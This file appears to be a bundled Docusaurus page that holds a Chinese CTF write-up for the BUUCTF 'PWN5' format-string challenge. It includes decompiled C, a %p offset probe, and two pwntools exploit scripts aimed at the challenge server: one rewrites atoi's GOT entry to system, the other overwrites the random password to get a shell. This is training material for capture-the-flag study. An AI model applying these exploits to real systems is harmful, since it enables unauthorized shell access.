(self.webpackChunkdocs=self.webpackChunkdocs||[]).push([[772],{3905:function(e,n,t){"use strict";t.d(n,{Zo:function(){return u},kt:function(){return f}});var r=t(7294);function a(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function o(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);n&&(r=r.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,r)}return t}function i(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?o(Object(t),!0).forEach((function(n){a(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):o(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function l(e,n){if(null==e)return{};var t,r,a=function(e,n){if(null==e)return{};var t,r,a={},o=Object.keys(e);for(r=0;r<o.length;r++)t=o[r],n.indexOf(t)>=0||(a[t]=e[t]);return a}(e,n);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(r=0;r<o.length;r++)t=o[r],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(a[t]=e[t])}return a}var p=r.createContext({}),s=function(e){var n=r.useContext(p),t=n;return e&&(t="function"==typeof e?e(n):i(i({},n),e)),t},u=function(e){var n=s(e.components);return r.createElement(p.Provider,{value:n},e.children)},c={inlineCode:"code",wrapper:function(e){var n=e.children;return r.createElement(r.Fragment,{},n)}},d=r.forwardRef((function(e,n){var t=e.components,a=e.mdxType,o=e.originalType,p=e.parentName,u=l(e,["components","mdxType","originalType","parentName"]),d=s(t),f=a,m=d["".concat(p,".").concat(f)]||d[f]||c[f]||o;return t?r.createElement(m,i(i({ref:n},u),{},{components:t})):r.createElement(m,i({ref:n},u))}));function f(e,n){var t=arguments,a=n&&n.mdxType;if("string"==typeof e||a){var o=t.length,i=new Array(o);i[0]=d;var l={};for(var p in n)hasOwnProperty.call(n,p)&&(l[p]=n[p]);l.originalType=e,l.mdxType="string"==typeof e?e:a,i[1]=l;for(var s=2;s<o;s++)i[s]=t[s];return r.createElement.apply(null,i)}return r.createElement.apply(null,t)}d.displayName="MDXCreateElement"},9707:function(e,n,t){"use strict";t.r(n),t.d(n,{frontMatter:function(){return l},contentTitle:function(){return p},metadata:function(){return s},toc:function(){return u},default:function(){return d}});var r=t(2122),a=t(9756),o=(t(7294),t(3905)),i=["components"],l={title:"\u3010\u7b2c\u4e94\u7a7a\u95f42019\u51b3\u8d5b\u3011PWN5",sidebar_position:1},p=void 0,s={unversionedId:"BUUCTF/\u683c\u5f0f\u5316\u5b57\u7b26\u4e32/\u7b2c\u4e94\u7a7a\u95f42019 \u51b3\u8d5bPWN5",id:"BUUCTF/\u683c\u5f0f\u5316\u5b57\u7b26\u4e32/\u7b2c\u4e94\u7a7a\u95f42019 \u51b3\u8d5bPWN5",isDocsHomePage:!1,title:"\u3010\u7b2c\u4e94\u7a7a\u95f42019\u51b3\u8d5b\u3011PWN5",description:"\u77e5\u8bc6\u70b9",source:"@site/docs\\BUUCTF\\\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\\\u7b2c\u4e94\u7a7a\u95f42019 \u51b3\u8d5bPWN5.md",sourceDirName:"BUUCTF/\u683c\u5f0f\u5316\u5b57\u7b26\u4e32",slug:"/BUUCTF/\u683c\u5f0f\u5316\u5b57\u7b26\u4e32/\u7b2c\u4e94\u7a7a\u95f42019 \u51b3\u8d5bPWN5",permalink:"/docs/BUUCTF/\u683c\u5f0f\u5316\u5b57\u7b26\u4e32/\u7b2c\u4e94\u7a7a\u95f42019 \u51b3\u8d5bPWN5",version:"current",sidebarPosition:1,frontMatter:{title:"\u3010\u7b2c\u4e94\u7a7a\u95f42019\u51b3\u8d5b\u3011PWN5",sidebar_position:1},sidebar:"tutorialSidebar",previous:{title:"not_the_same_3dsctf_2016",permalink:"/docs/BUUCTF/\u6808\u6ea2\u51fa/not_the_same_3dsctf_2016"}},u=[{value:"\u77e5\u8bc6\u70b9",id:"\u77e5\u8bc6\u70b9",children:[]},{value:"\u89e3\u9898\u5206\u6790",id:"\u89e3\u9898\u5206\u6790",children:[]}],c={toc:u};function d(e){var n=e.components,t=(0,a.Z)(e,i);return(0,o.kt)("wrapper",(0,r.Z)({},c,t,{components:n,mdxType:"MDXLayout"}),(0,o.kt)("h2",{id:"\u77e5\u8bc6\u70b9"},"\u77e5\u8bc6\u70b9"),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u5229\u7528")),(0,o.kt)("h2",{id:"\u89e3\u9898\u5206\u6790"},"\u89e3\u9898\u5206\u6790"),(0,o.kt)("p",null,"checksec\u7ed3\u679c\uff1a"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"\u250c\u2500\u2500(kali\u327fkali)-[~/Desktop]\n\u2514\u2500$ checksec --file=pwn           \nRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE\nPartial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols        No    0               2               pwn\n")),(0,o.kt)("p",null,"\u62d6\u5165ida\u5206\u6790\uff0c",(0,o.kt)("inlineCode",{parentName:"p"},"main"),"\u6e90\u7801\u5982\u4e0b\uff1a"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-c"},'int __cdecl main(int a1)\n{\n  unsigned int v1; // eax\n  int result; // eax\n  int fd; // [esp+0h] [ebp-84h]\n  char nptr[16]; // [esp+4h] [ebp-80h] BYREF\n  char buf[100]; // [esp+14h] [ebp-70h] BYREF\n  unsigned int v6; // [esp+78h] [ebp-Ch]\n  int *v7; // [esp+7Ch] [ebp-8h]\n\n  v7 = &a1;\n  v6 = __readgsdword(0x14u);\n  setvbuf(stdout, 0, 2, 0);\n  v1 = time(0);\n  srand(v1);\n  fd = open("/dev/urandom", 0);\n  read(fd, &dword_804C044, 4u);\n  printf("your name:");\n  read(0, buf, 0x63u);\n  printf("Hello,");\n  //highlight-next-line\n  printf(buf);\n  printf("your passwd:");\n  read(0, nptr, 0xFu);\n  if ( atoi(nptr) == dword_804C044 )\n  {\n    puts("ok!!");\n    system("/bin/sh");\n  }\n  else\n  {\n    puts("fail");\n  }\n  result = 0;\n  if ( __readgsdword(0x14u) != v6 )\n    sub_80493D0();\n  return result;\n}\n')),(0,o.kt)("p",null,"\u6839\u636e\u6e90\u7801\u53ef\u77e5\u7a0b\u5e8f\u6d41\u7a0b\u5982\u4e0b\uff1a"),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"\u8f93\u5165\u540d\u5b57"),(0,o.kt)("li",{parentName:"ol"},"\u8f93\u51fa'Hello,'\u52a0\u8f93\u5165\u7684\u540d\u5b57"),(0,o.kt)("li",{parentName:"ol"},"\u8f93\u5165\u5bc6\u7801"),(0,o.kt)("li",{parentName:"ol"},"\u5c06\u8f93\u5165\u5bc6\u7801\u548c\u968f\u673a\u751f\u6210\u76844\u4f4d\u5bc6\u7801\u6bd4\u8f83\uff0c\u6b63\u786e\u5c31\u6267\u884csystem('/bin/sh')\uff0c\u9519\u8bef\u5c31\u63d0\u793a\u9519\u8bef")),(0,o.kt)("p",null,"\u89c2\u5bdf2\u4e2a\u53ef\u8f93\u5165\u7684\u70b9\uff0c\u8bfb\u5165\u957f\u5ea6\u90fd\u6ca1\u6709\u8d85\u8fc7\u53ef\u63a5\u6536\u7684\u957f\u5ea6\uff0c\u56e0\u6b64\u65e0\u6cd5\u76f4\u63a5\u6808\u6ea2\u51fa\u3002"),(0,o.kt)("p",null,"\u89c2\u5bdf\u5230\u540d\u5b57\u8f93\u51fa\u90e8\u5206\u4ee3\u7801",(0,o.kt)("inlineCode",{parentName:"p"},"printf(buf)"),"\uff0c\u5b58\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u3002"),(0,o.kt)("p",null,"\u6d4b\u8bd5\u4e00\u4e0b\uff0c\u770b\u770b\u504f\u79fb"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"\u250c\u2500\u2500(kali\u327fkali)-[~/Desktop]\n\u2514\u2500$ ./pwn           \nyour name:aaaa--%p--%p--%p--%p--%p--%p--%p--%p--%p--%p--%p--%p--%p--%p\nHello,aaaa--0xffa5a3e8--0x63--(nil)--0xf7f4dae0--0x3--0xf7f1a410--0x1--(nil)--0x1--0x61616161--0x70252d2d--0x70252d2d--0x70252d2d--0x70252d2d\n2\ufffd\ufffdyour passwd:123\nfail\n")),(0,o.kt)("p",null,"\u53ef\u4ee5\u770b\u5230\u7b2c10\u4e2a%p\u5904\u7684\u8f93\u51fa\u7ed3\u679c\u662f",(0,o.kt)("inlineCode",{parentName:"p"},"0x61616161"),"\uff0c\u5f97\u5230\u504f\u79fb\u91cf\u662f10\u3002"),(0,o.kt)("p",null,"\u63a5\u4e0b\u6765\u5b58\u5728\u67092\u79cd\u65b9\u6cd5\u53ef\u4ee5\u83b7\u53d6\u6743\u9650\uff1a"),(0,o.kt)("ol",{start:2},(0,o.kt)("li",{parentName:"ol"},"\u7528fmtstr_payload\u6539\u5199atoi\u5730\u5740\uff0c\u5c06\u5176\u6539\u4e3asystem\u5730\u5740"),(0,o.kt)("li",{parentName:"ol"},"\u7528fmtstr_payload\u6539\u5199\u968f\u673a\u7684\u6570\u636e")),(0,o.kt)("p",null,"\u8fd9\u4e24\u79cd\u65b9\u5f0f\u7684\u811a\u672c\u4f9d\u6b21\u5982\u4e0b\uff1a"),(0,o.kt)("p",null,"exp1\uff1a"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-python"},"from pwn import *\n\nis_debug = 1\nfile_name = './pwn'\nhost = 'node3.buuoj.cn'\nport = 26031\n\ndef main():\n    if is_debug:\n        sh = process(file_name)\n    else:\n        sh = remote(host, port)\n        \n    elf = ELF(file_name)\n    atoi_got = elf.got['atoi']\n    system_plt = elf.plt['system']\n    \n    payload = fmtstr_payload(10, {atoi_got: system_plt})\n    sh.sendline(payload)\n    sh.sendline('/bin/sh\\x00')\n    sh.interactive()\n\nif __name__ == '__main__':\n    main()\n")),(0,o.kt)("p",null,"exp2\uff1a"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-python"},"from pwn import *\n\nis_debug = 0\nfile_name = './pwn'\nhost = 'node3.buuoj.cn'\nport = 26031\n\ndef main():\n    if is_debug:\n        sh = process(file_name)\n    else:\n        sh = remote(host, port)\n        \n    dword_804C044 = 0x804C044\n    \n    payload = fmtstr_payload(10, {dword_804C044: 0x1111})\n    sh.sendlineafter('your name', payload)\n    sh.sendlineafter('your passwd',str(0x1111))\n    sh.interactive()\n\nif __name__ == '__main__':\n    main()\n")))}d.isMDXComponent=!0}}]);